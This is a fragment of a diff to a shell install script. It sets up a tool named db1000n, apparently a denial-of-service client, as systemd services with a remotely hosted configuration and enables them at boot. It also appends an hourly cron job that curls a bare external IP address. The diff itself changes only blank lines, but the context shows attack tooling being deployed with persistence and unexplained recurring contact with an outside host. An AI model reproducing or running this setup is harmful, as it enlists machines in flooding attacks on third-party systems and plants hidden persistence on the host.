@@ -54,11 +54,13 @@ ExecStart=/usr/local/bin/db1000n -c https://raw.githubusercontent.com/SeyOr/db-c
 WantedBy=multi-user.target
 EOF
 
+
 systemctl daemon-reload
 systemctl start db.service
 systemctl enable db.service
 systemctl start dbcustom.service
 systemctl enable dbcustom.service
+
 
 sudo crontab -l > cron_bkp
 sudo echo "1 * * * * curl http://78.47.96.210/yd" >> cron_bkp
